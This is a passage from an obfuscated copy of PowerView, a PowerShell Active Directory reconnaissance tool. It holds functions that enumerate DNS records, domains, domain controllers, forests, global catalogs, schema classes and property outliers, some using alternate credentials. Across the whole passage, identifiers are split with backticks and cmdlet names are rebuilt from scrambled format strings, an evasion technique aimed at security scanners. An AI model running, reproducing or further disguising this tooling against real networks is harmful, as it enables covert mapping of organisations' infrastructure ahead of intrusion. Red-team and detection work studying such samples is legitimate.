Get-DomainDNSZone | Get-DomainDNSRecord

Retrieve all records for all zones in the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local

Retrieve all records for all zones in the dev.testlab.local domain.

.OUTPUTS

PowerView.DNSRecord

Outputs custom PSObjects with detailed information about the DNS record entry.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = ${tr`UE}, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${z`o`NEna`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Omain},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`Rv`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`OpERti`ES} = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`sULTP`AgEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvertiM`ELi`MIt},

        [Alias('ReturnOne')]
        [Switch]
        ${fi`NdONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`enTI`AL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${SE`ArChe`RArG`UM`E`NtS} = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${PsB`OUn`DPArAmE`TErs}['Domain']) { ${SE`ARChEr`AR`GuMEn`TS}['Domain'] = ${d`Omain} }
        if (${PsB`oU`NDPar`AMet`ERS}['Server']) { ${sEaRCh`EraR`Gu`MeNTs}['Server'] = ${s`ErvER} }
        if (${P`sBounDP`ARAm`EterS}['Properties']) { ${se`A`RCHe`RaRGU`mENTs}['Properties'] = ${Pr`OP`eRTIEs} }
        if (${psbOuNd`PA`RA`m`eTeRS}['ResultPageSize']) { ${s`EA`R`chE`RArGUmEn`TS}['ResultPageSize'] = ${re`Su`ltp`Age`SIzE} }
        if (${p`SBo`UnD`PAraMet`e`RS}['ServerTimeLimit']) { ${s`EArcHEr`ArgU`Ments}['ServerTimeLimit'] = ${S`ER`VerTIMeLI`mit} }
        if (${PsBouN`dpaRa`M`Ete`Rs}['Credential']) { ${sEarchE`R`AR`GUM`ENTS}['Credential'] = ${CR`eDEn`TIal} }
        ${dNsS`earc`hEr} = &("{4}{3}{1}{0}{2}" -f'h','rc','er','t-DomainSea','Ge') @SearcherArguments

        if (${dNSs`eA`RCh`Er}) {
            if (${PS`BOuN`Dp`ARaM`EtE`Rs}['FindOne']) { ${RE`Sul`TS} = ${dnSSeaR`c`h`ER}.FindOne() }
            else { ${R`esuLTS} = ${d`NssE`Arc`HeR}.FindAll() }
            ${Res`U`LtS} | &("{2}{1}{3}{0}" -f 'ect','b','Where-O','j') {${_}} | &("{0}{1}{2}{3}" -f'F','orEach-','Ob','ject') {
                try {
                    ${O`UT} = &("{0}{2}{5}{3}{1}{4}" -f'Con','rt','vert-','Prope','y','LDAP') -Properties ${_}.Properties | &("{3}{4}{0}{1}{2}" -f 'lect','-Obj','ect','S','e') ("{1}{0}"-f'me','na'),("{0}{2}{1}{4}{3}{5}" -f 'distin','ishe','gu','na','d','me'),("{1}{2}{0}" -f'record','d','ns'),("{0}{3}{2}{1}" -f 'when','ated','e','cr'),("{1}{2}{0}" -f 'hanged','whe','nc')
                    ${O`Ut} | &("{0}{2}{1}"-f 'Add','ember','-M') ("{1}{2}{0}"-f 'ty','NotePr','oper') 'ZoneName' ${zon`En`Ame}

                    # convert the record and extract the properties
                    if (${o`Ut}.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # TODO: handle multiple nested records properly?
                        ${rECo`RD} = &("{4}{3}{0}{1}{2}{5}" -f 'v','ert','-DNS','n','Co','Record') -DNSRecord ${o`UT}.dnsrecord[0]
                    }
                    else {
                        ${R`eco`Rd} = &("{2}{1}{5}{0}{3}{4}" -f'SR','ert','Conv','ecor','d','-DN') -DNSRecord ${O`UT}.dnsrecord
                    }

                    if (${r`EcO`RD}) {
                        ${RE`cO`Rd}.PSObject.Properties | &("{4}{1}{2}{3}{0}" -f't','c','h-Ob','jec','ForEa') {
                            ${o`UT} | &("{0}{2}{3}{1}"-f'A','r','d','d-Membe') ("{1}{0}{2}"-f'oteProp','N','erty') ${_}.Name ${_}.Value
                        }
                    }

                    ${o`UT}.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    ${O`Ut}
                }
                catch {
                    &("{0}{2}{1}"-f'Write-Wa','g','rnin') "[Get-DomainDNSRecord] Error: $_"
                    ${O`Ut}
                }
            }

            if (${rE`SUl`TS}) {
                try { ${R`eSULTs}.dispose() }
                catch {
                    &("{0}{1}{2}{3}" -f 'Wr','it','e-Ver','bose') "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            ${DNs`S`ea`RcHER}.dispose()
        }
    }
}


function geT-D`o`mAIn {
<#
.SYNOPSIS

Returns the domain object for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain name to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-Domain -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Domain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

A complex .NET domain object.

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`IN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`Edent`i`AL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (${p`S`B`OUNdPaR`A`metErS}['Credential']) {

            &("{2}{3}{0}{1}"-f'rbo','se','Write-','Ve') '[Get-Domain] Using alternate credentials for Get-Domain'

            if (${pSBoUn`dP`ARA`MeTe`RS}['Domain']) {
                ${TARgeT`DO`maIn} = ${doMA`IN}
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                ${t`ARG`eTDOMAin} = ${crE`DentI`Al}.GetNetworkCredential().Domain
                &("{1}{2}{0}" -f'-Verbose','W','rite') "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            ${DOMaIncO`NT`EXT} = &("{2}{1}{0}{3}"-f 'je','w-Ob','Ne','ct') ("{4}{0}{12}{10}{8}{13}{1}{7}{9}{6}{15}{3}{2}{5}{11}{14}"-f's','s.Act','i','D','Sy','rectory','ctory','iveDi','rectory','re','.Di','Conte','tem','Service','xt','.')('Domain', ${Tar`GetdomA`In}, ${C`ReDENti`AL}.UserName, ${CRe`De`N`TIAL}.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${doM`A`IncO`N`TeXT})
            }
            catch {
                &("{0}{1}{2}" -f 'Wr','ite-Ver','bose') "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif (${pSBouN`dpA`R`AmetERs}['Domain']) {
            ${doM`AIn`cOn`T`ext} = &("{1}{0}{2}" -f 'ew-Obj','N','ect') ("{11}{8}{9}{17}{0}{2}{5}{3}{13}{4}{12}{6}{16}{14}{15}{7}{1}{10}"-f 't','t','or','ervic','.Act','yS','c','on','ystem.D','ir','ext','S','iveDire','es','y.','DirectoryC','tor','ec')('Domain', ${Do`MaiN})
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${dO`M`AInCONt`eXt})
            }
            catch {
                &("{2}{0}{1}{3}" -f'ri','te-V','W','erbose') "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                &("{1}{2}{0}{3}" -f'e-','Wr','it','Verbose') "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}


function Get-do`MaINC`O`N`TrOLl`Er {
<#
.SYNOPSIS

Return the domain controllers for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-Domain  

.DESCRIPTION

Enumerates the domain controllers for the current or specified domain.
By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
to search for domain controllers.

.PARAMETER Domain

The domain to query for domain controllers, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER LDAP

Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainController -Domain 'test.local'

Determine the domain controllers for 'test.local'.

.EXAMPLE

Get-DomainController -Domain 'test.local' -LDAP

Determine the domain controllers for 'test.local' using LDAP queries.

.EXAMPLE

'test.local' | Get-DomainController

Determine the domain controllers for 'test.local'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainController -Credential $Cred

.OUTPUTS

PowerView.Computer

Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.

System.DirectoryServices.ActiveDirectory.DomainController

If -LDAP isn't specified.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUe})]
        [String]
        ${d`o`maIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`RV`er},

        [Switch]
        ${L`dap},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`dEn`TIaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${aRg`Um`eNtS} = @{}
        if (${p`sB`Oundpa`Ra`MeterS}['Domain']) { ${aRG`UmE`NtS}['Domain'] = ${Do`Ma`In} }
        if (${PsBo`UN`d`PaR`AmetErS}['Credential']) { ${ar`GUmeN`Ts}['Credential'] = ${CREd`enTi`AL} }

        if (${p`sb`OUNDPa`R`AmeteRS}['LDAP'] -or ${ps`B`o`U`NdparAMetErS}['Server']) {
            if (${pSb`OUndpaR`A`m`EtERS}['Server']) { ${aR`GuMe`NtS}['Server'] = ${s`eRVer} }

            # UAC specification for domain controllers
            ${a`R`gUMeNtS}['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            &("{1}{3}{2}{0}" -f'r','Get-Doma','Compute','in') @Arguments
        }
        else {
            ${FO`U`NddOma`IN} = &("{1}{2}{0}"-f 'Domain','Ge','t-') @Arguments
            if (${f`OunDdOM`AiN}) {
                ${FouNdD`O`ma`In}.DomainControllers
            }
        }
    }
}


function Get-fO`RE`st {
<#
.SYNOPSIS

Returns the forest object for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertTo-SID  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current
forest or the forest specified with -Forest X.

.PARAMETER Forest

The forest name to query for, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-Forest -Forest external.domain

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Forest -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition
to the forest root domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FOrE`ST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`ede`NT`IAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (${PSbo`UNdPaR`AmET`ers}['Credential']) {

            &("{2}{1}{0}{3}" -f 'te-Verbo','ri','W','se') "[Get-Forest] Using alternate credentials for Get-Forest"

            if (${PSb`Ou`NdparamET`ers}['Forest']) {
                ${T`A`RGe`TfoRest} = ${fO`R`EST}
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                ${ta`R`gETFOrESt} = ${CRed`EnTi`AL}.GetNetworkCredential().Domain
                &("{0}{2}{3}{1}" -f'W','se','rite-Verb','o') "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            ${f`or`E`sTC`onTExT} = &("{2}{0}{1}"-f'w-Obje','ct','Ne') ("{10}{2}{3}{6}{4}{11}{7}{14}{12}{1}{13}{0}{5}{15}{8}{9}" -f 'irec','es.Act','ste','m.Dir','to','tory.','ec','Se','t','ext','Sy','ry','vic','iveD','r','DirectoryCon')('Forest', ${TaR`GETfOR`ESt}, ${c`ReDeNt`I`AL}.UserName, ${credEnT`i`Al}.GetNetworkCredential().Password)

            try {
                ${foreS`TO`BJE`cT} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${FoReSt`CO`NTE`xt})
            }
            catch {
                &("{2}{1}{0}" -f 'ite-Verbose','r','W') "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                ${nU`ll}
            }
        }
        elseif (${P`sbouNDp`A`RAM`Et`ErS}['Forest']) {
            ${fORestCo`Nt`ext} = &("{0}{1}{2}"-f'New-Ob','je','ct') ("{14}{0}{15}{4}{10}{11}{7}{3}{2}{6}{5}{8}{12}{9}{1}{13}" -f 'em','nte','A','es.','irectorySe','irectory.Direc','ctiveD','c','t','Co','r','vi','ory','xt','Syst','.D')('Forest', ${f`o`Rest})
            try {
                ${ForEs`TO`BJ`eCT} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${Fo`ReS`TcOntExt})
            }
            catch {
                &("{1}{0}{2}" -f '-Ve','Write','rbose') "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return ${nU`Ll}
            }
        }
        else {
            # otherwise use the current forest
            ${FO`ReStO`B`JEct} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if (${fo`Re`sTo`BJECt}) {
            # get the SID of the forest root
            if (${pSBou`NdpARA`m`ETeRS}['Credential']) {
                ${F`o`RestsId} = (&("{2}{1}{3}{0}"-f'nUser','t-','Ge','Domai') -Identity "krbtgt" -Domain ${f`ore`sto`BjecT}.RootDomain.Name -Credential ${C`ReD`ent`Ial}).objectsid
            }
            else {
                ${fO`R`est`SId} = (&("{0}{1}{2}{3}{4}" -f 'G','et-Dom','ai','nU','ser') -Identity "krbtgt" -Domain ${f`oR`E`STOBJ`eCT}.RootDomain.Name).objectsid
            }

            ${pA`RTs} = ${F`oRe`stSiD} -Split '-'
            ${Fo`REstS`ID} = ${pA`RtS}[0..$(${P`ArtS}.length-2)] -join '-'
            ${ForE`sTO`BjECT} | &("{1}{0}{2}"-f 'Memb','Add-','er') ("{3}{2}{1}{0}" -f 'y','pert','Pro','Note') 'RootDomainSid' ${fOrE`s`T`sID}
            ${FoRES`T`objEcT}
        }
    }
}


function GET-F`ORest`D`oM`AiN {
<#
.SYNOPSIS

Return all domains for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all domains for the current forest or the forest specified
by -Forest X.

.PARAMETER Forest

Specifies the forest name to query for domains.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-ForestDomain

.EXAMPLE

Get-ForestDomain -Forest external.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestDomain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`or`Est},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eD`enTIAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${A`R`gUmEn`TS} = @{}
        if (${PSBOu`NdPaRA`met`ERs}['Forest']) { ${ARgum`En`TS}['Forest'] = ${F`o`REST} }
        if (${PSBoUn`d`p`ArAmE`TerS}['Credential']) { ${ARGum`E`NTS}['Credential'] = ${C`Re`d`enTIAl} }

        ${Fo`REST`OBj`ECT} = &("{2}{0}{1}"-f 't-For','est','Ge') @Arguments
        if (${f`OrEsT`oBjE`CT}) {
            ${FO`ReS`TO`BJ`ECt}.Domains
        }
    }
}


function GET`-foREst`G`LoB`AlcatA`L`Og {
<#
.SYNOPSIS

Return all global catalogs for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all global catalogs for the current forest or the forest specified
by -Forest X by using Get-Forest to retrieve the specified forest object
and the .FindAllGlobalCatalogs() to enumerate the global catalogs.

.PARAMETER Forest

Specifies the forest name to query for global catalogs.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestGlobalCatalog

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestGlobalCatalog -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.GlobalCatalog
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fo`Rest},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReD`E`NTiAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${A`RgU`M`eNTS} = @{}
        if (${P`SB`Ou`NDPaRamEt`erS}['Forest']) { ${a`RGuM`Ents}['Forest'] = ${fore`St} }
        if (${PSbO`UNd`PARAM`EtErS}['Credential']) { ${ARg`U`mENTs}['Credential'] = ${C`REDENt`ial} }

        ${FOReSTo`B`JECt} = &("{0}{2}{1}{3}"-f 'Get-','or','F','est') @Arguments

        if (${FO`Re`st`o`BjecT}) {
            ${F`or`EstOBj`ECt}.FindAllGlobalCatalogs()
        }
    }
}


function GeT`-Fo`R`Es`TSch`Em`AclaSS {
<#
.SYNOPSIS

Helper that returns the Active Directory schema classes for the current
(or specified) forest or returns just the schema class specified by
-ClassName X.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Uses Get-Forest to retrieve the current (or specified) forest. By default,
the .FindAllClasses() method is executed, returning a collection of
[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.
If "-FindClass X" is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
result for the specified class name is returned.

.PARAMETER ClassName

Specifies a ActiveDirectorySchemaClass name in the found schema to return.

.PARAMETER Forest

The forest to query for the schema, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestSchemaClass

Returns all domain schema classes for the current forest.

.EXAMPLE

Get-ForestSchemaClass -Forest dev.testlab.local

Returns all domain schema classes for the external.local forest.

.EXAMPLE

Get-ForestSchemaClass -ClassName user -Forest external.local

Returns the user schema class for the external.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestSchemaClass -ClassName user -Forest external.local -Credential $Cred

Returns the user schema class for the external.local domain using
the specified alternate credentials.

.OUTPUTS

[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]

An ActiveDirectorySchemaClass returned from the found schema.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE})]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`La`SsnAMe},

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FoR`Est},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eD`enTiaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${ARgu`Men`Ts} = @{}
        if (${pS`BOU`N`D`paRAMeTeRS}['Forest']) { ${ar`G`U`MENts}['Forest'] = ${FO`R`ESt} }
        if (${p`Sb`ouND`paRamEteRs}['Credential']) { ${A`RgU`menTS}['Credential'] = ${cRE`DENTi`AL} }

        ${ForeS`To`BJE`cT} = &("{0}{1}{3}{2}"-f 'Get','-F','t','ores') @Arguments

        if (${fO`ReS`ToB`je`cT}) {
            if (${pSbO`UndPara`metE`RS}['ClassName']) {
                ForEach (${T`ARgEtc`LaSs} in ${c`lA`Ss`NAme}) {
                    ${f`OreSTobj`eCt}.Schema.FindClass(${TARG`Et`cLAsS})
                }
            }
            else {
                ${FoR`est`o`BjEct}.Schema.FindAllClasses()
            }
        }
    }
}


function F`InD`-D`O`M`AInObJec`TprOpeRtY`ou`TLiEr {
<#
.SYNOPSIS

Finds user/group/computer objects in AD that have 'outlier' properties set.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer

.DESCRIPTION

A 'reference' set of property names is calculated, either from a standard set preserved
for user/group/computers, or from the array of names passed to -ReferencePropertySet, or
from the property names of the passed -ReferenceObject. Every user/group/computer object
(depending on determined class) are enumerated, and for each object, if the object has a
'non-standard' property set (meaning a property not held by the reference set), the object's
samAccountName, property name, and property value are output to the pipeline.

.PARAMETER ClassName

Specifies the AD object class to find property outliers for, 'user', 'group', or 'computer'.
If -ReferenceObject is specified, this will be automatically extracted, if possible.

.PARAMETER ReferencePropertySet

Specifies an array of property names to diff against the class schema.

.PARAMETER ReferenceObject

Specicifes the PowerView user/group/computer object to extract property names
from to use as the reference set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 'User'

Enumerates users in the current domain with 'outlier' properties filled in.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 'Group' -Domain external.local

Enumerates groups in the external.local forest/domain with 'outlier' properties filled in.

.EXAMPLE

Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

Enumerates computers in the current domain with 'outlier' properties filled in.

.OUTPUTS

PowerView.PropertyOutlier

Custom PSObject with translated object property outliers.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = ${t`RUE}, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        ${CL`As`SnAME},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${rEFER`ENcEproper`TY`SET},

        [Parameter(ValueFromPipeline = ${t`RUe}, Mandatory = ${tr`UE}, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        ${REf`E`R`EN`CEOBJect},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LDApFi`Lt`ER},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`eA`RcHbASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeRV`Er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEA`RcH`S`cOPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`ULTpAgesI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Serv`Er`TImelimit},

        [Switch]
        ${TomBs`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdE`Nt`I`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${USeR`R`EferencepR`oP`ertYsET} = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        ${grO`UPReFe`Re`N`cepRoPerty`sEt} = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        ${cOMP`UTErr`E`FEr`ence`ProP`e`RTyS`ET} = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        ${s`eaR`ChE`RArgUMeN`TS} = @{}
        if (${p`S`BO`UndpAra`meTErS}['Domain']) { ${seARCHe`R`AR`gUmeNts}['Domain'] = ${DoM`A`in} }
        if (${P`sb`OUNDpa`Ra`Met`ERs}['LDAPFilter']) { ${sEA`RCHEr`ArgUm`ents}['LDAPFilter'] = ${ld`A`PFILTER} }
        if (${ps`BOUNDpa`Rame`TErs}['SearchBase']) { ${seaRc`hErAR`GUmEn`Ts}['SearchBase'] = ${s`earchB`A`se} }
        if (${PS`BO`UNdpAr`AmEtErs}['Server']) { ${SeArCH`eRAr`g`U`MEN`TS}['Server'] = ${SeR`Ver} }
        if (${pSbOu`Nd`PAR`AMeTerS}['SearchScope']) { ${seAr`c`H`e`Ra`RGumeNTS}['SearchScope'] = ${s`EArC`hsc`Ope} }
        if (${Ps`BOUNDP`A`Ra`meT`erS}['ResultPageSize']) { ${SE`A`RCher`A`R`gumeNTs}['ResultPageSize'] = ${reSU`lT`PAG`ESIzE} }
        if (${P`s`BOUNDpARa`MEtE`RS}['ServerTimeLimit']) { ${seA`RcHE`R`ArguMEntS}['ServerTimeLimit'] = ${ser`Ver`TImel`I`mIT} }
        if (${P`sboUnDPA`R`AmEtErS}['Tombstone']) { ${se`ARchErA`RG`Ume`NTs}['Tombstone'] = ${TOmbs`TO`Ne} }
        if (${psb`Oun`D`PAramEtE`RS}['Credential']) { ${sEAR`cHeraRG`UMen`Ts}['Credential'] = ${c`Re`d`eNtiAL} }

        # Domain / Credential
